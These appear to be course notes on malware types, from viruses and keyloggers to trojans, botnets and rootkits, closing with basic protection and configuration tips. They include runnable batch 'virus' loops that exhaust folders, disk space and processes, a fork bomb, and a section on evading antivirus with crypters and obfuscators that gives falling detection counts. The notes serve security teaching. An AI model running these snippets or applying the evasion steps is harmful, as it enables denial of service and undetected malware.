---------------------
Malware --> MAL + WARE
MAL -> MALicious 
WARE -> softWARE

Malware are malicious softwares which can cause harm to the system. These can be anything, tools, applications, softwares, file.
Types Of Malware:
	1. Virus
	2. Worms
	3. Trojan
	4. Keyloggers
	5. Spywares
	6. Ransomware
	7. Botnet
	8. Rootkits
	9. Adwares

1. VIRUS
========
	Vital Information Resource Under Seize
	Virus can be an application, tool, software, which can harm the system and system files of the device. 
	Symptoms of virus
		Slow
		Slow Processing
		Delete
		Attribute change
		Extension Change
		Shortcut keys|Files
	It will remain dormant, until a user executes it. Virus needs human assistance for executing itself.

Batch File Virus
================
1. Infinite Folder
------------------
	:loop
	mkdir %random%
	goto loop

2. Cascading folder and file
----------------------------
	:rudra
      	mkdir mohit
      	echo This is a simple sentence >>mohit.txt
      	cd mohit
      	goto rudra

3. Space Eating Virus
---------------------
	echo hello>>file.txt
	:loop
	type file.txt>>file.txt
	goto loop

4. Process Calling
------------------
	:loop
	start cmd.exe /c
	goto loop

5. Fork Bombing
---------------
	%0|%0

2. Keyloggers
=============
	These are the applications which are used to grab the key strokes of the devices. It is just like an extra layer, which takes the keys and dump them on the screen.
	1. Online Based| Remote --> iStealer
	2. Local Storage
		Family Key Logger
			http://www.spyarsenal.com/download.html
		BPK Keylogger
		Refog Keylogger
	Screenshoter --> when ever you press anything, key or mouse click, then your application will take a screenshot.
	Screen Recorder

3. Ransomware
=============
	It is when your system gets hijack and all the system files get encrypted by the attacker and you need to pay some ransom to the attacker for decrypting the files.
		WannaCry
		Petya
		Bad Rabbit

4. Worms
========
	These are the malwares which spread by itself. It needs human assistance just for once. Common feature
					Replication
					Copy Itself
					Spread Through Pen drive or mail
					It is target specific
		Conficker worm --> 1,00,000 Devices

5. Trojans
----------
	These are the malware which helps an attacker to gain the remote access of the target device. Remote Access ---> Backdooring. I can have the access, can download any file, can upload any file. can use anything and can manipulate the data.
	There are two types of trojans:
		1. Forward Connection
		2. Reverse Connection

1. Forward Connection
---------------------
	When the attacker have the target's IP Address, then he can directly attack the system.
	1. Target keeps on moving --> IP Address of the target will keep on changing
	2. It will be very very hard for an attacker to get the target's IP Address everytime, when he will change the location.


2. Reverse Connection
---------------------	
	The attacker do always have his own IP Address. then the attacker can craft an application which is embedded with his own IP Address. He will send the application to the target. As soon as the target will execute the application, the attacker will receive a reverse remote connection.

RAT --> Remote Administrative|Access Tools
	These are third party tools which are used for creating Trojans.
	Dark Comet

How Does Anti-Malware Works
===========================
	All of the Anti-Malware works on the basis of signature. If they have the signature of the trojan in the database, it means, that it is a malware else the file is clean.

How to evade Anti-Malware?
==========================
	If I can change the signature it means I can evade the Anti-Malware. We will change the signature of trojan, so that we can evade Anti-Malware.
	With the help of these tools we can change the signature of the trojan:
		1. Binders
		2. Crypters
		3. Hex Editors --> Neo Hex Editor
		4. Obfuscators -> Red Gate Smart Assembly

Binder and crypter
==================
	Chrome Crypter
	URGE Crypter

Raw --> 57/65
Raw + Chrome Crypter --> 35/65
Raw + Chrome Crypter + URGE Crypter --> 29/60
Raw + Chrome Crypter + URGE Crypter + Red Gate Smart Assembly --> 12/65

Scan the network with angry IP Scanner

6. Botnets
==========
	BOTNET = BOT + NET
		BOT = roBOT
		NET = NETwork
	It means that you are connected in the network, and are controlling many devices. 
	The attacker deployed the trojan in n number of systems and devices and controlling it. That whole network of trojan is known as botnet.
		Ares Botnet

7. Rootkits
===========
	Which are or can be planted in the root of the device. Administrator, Kernel.
	These are the malware which attacks and effects the kernel level and hard to find and hard to remove.

System Protection From Malware and Secure System Configuration
===============================================================
Security
--------
	1. Firewall Should always be enabled.
	2. Anti-Virus Should always be installed and updated.
	3. Windows patches and updates.
	4. Always use sandbox|Virtualised environment for analysing or running a suspicious application.
		Sandboxie --> Virtual and simulated environment for analysing
		Virtual Box Simulation
	5. EXE radar

Configuration
-------------
	1. attrib --> for checking the attribute
	2. services
	3. Activated services
	4. Startup Service
		msconfig ---> startup
	5. netstat
	6. netstat -b
		-b --> applications which are binded to the port
	7. netstat -ona
		all | ports | Numeric Form
	8. Firewall Rule
